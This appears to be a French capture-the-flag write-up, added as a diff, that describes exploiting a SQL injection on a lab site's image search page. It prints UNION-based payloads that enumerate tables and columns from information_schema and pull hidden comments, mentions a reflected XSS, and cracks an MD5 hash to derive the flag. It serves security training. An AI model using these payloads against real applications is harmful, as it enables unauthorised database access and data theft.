@@ -1,0 +1,40 @@
+Sur la page search (recherche d'image), je remarque que les entrees sont exclusivement numeriques,
+je tente donc une injection SQL :
+
+http://192.168.56.101/?page=searchimg&id=1%20OR%201=1%20--&Submit=Submit#
+Affiche tout les liens image du site, notons que l'ID affiche est la variable $_GET("id") et que
+cette variable n'est pas protegee aux failles XSS, laissant une faille XSS reflechie (Peu utile ici)
+
+La requete semble etre de la forme "SELECT * FROM images WHERE id = " + $_GET("id") + ";"
+(Nom de table non contractuel)
+
+Je test donc un nouveau payload afin de recuperer le nom des tables et leur schema :
+1 OR 1=1 UNION ALL SELECT table_schema,table_name FROM information_Schema.tables--
+
+Un resultat est particulierement interessant :
+Title: users
+Url : Member_Sql_Injection
+
+Second payload, pour recuperer les noms de colonnes des tables :
+UNION ALL SELECT table_name,column_name FROM information_Schema.columns--
+
+Pour la table db_default (Members_Brute_Force) :
+id, username, password
+Pour la table users (Members_Sql_Injection) :
+user_id, first_name, last_name, town, country, planet, Commentaire, countersign
+Pour la table list_images (Member_images):
+id, url, title, comment
+Pour la table vote_dbs (Member_survey) :
+id_vote, vote, nb_vote, subject
+Pour la table guestbook (Member_guestbook) :
+id_comment, comment, name
+
+La table user est en effet inaccessible, etant situee sur un autre Schema, cependant je peux recuperer les valeurs comment de la
+table list_images qui me sont pas affiches par defaut via le payload :
+UNION ALL SELECT comment, title FROM list_images--
+
+Ce qui me permet pour l'image Hack me ? d'obtenir le commentaire suivant :
+If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Je reverse donc le hash md5 via crackstation puis le rehash en sha256 afin d'obtenir le flag.
+
+
